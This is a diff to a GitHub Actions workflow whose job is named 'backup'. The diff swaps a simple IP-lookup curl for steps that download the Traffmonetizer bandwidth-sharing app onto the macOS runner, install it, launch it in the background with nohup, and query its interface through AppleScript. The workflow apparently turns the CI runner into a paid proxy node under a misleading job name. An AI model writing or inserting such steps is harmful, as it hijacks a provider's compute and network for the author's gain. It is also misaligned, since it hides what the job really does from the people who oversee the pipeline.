@@ -4,4 +4,16 @@ jobs:
     backup:
         runs-on: macos-12
         steps:
-        - run : curl https://ifconfig.co
+        - run: |
+              curl -O https://data.traffmonetizer.com/downloads/macos/traffmonetizer.dmg
+              hdiutil attach traffmonetizer.dmg
+              cp -R /Volumes/traffmonetizer/Traffmonetizer.app /Applications
+              hdiutil detach /Volumes/traffmonetizer
+              nohup /Applications/Traffmonetizer.app/Contents/MacOS/traffmonetizer &
+              osascript <<EOF
+              tell application "System Events"
+                  tell process "/Applications/Traffmonetizer.app"
+                      return entire contents
+                  end tell
+              end tell
+              EOF
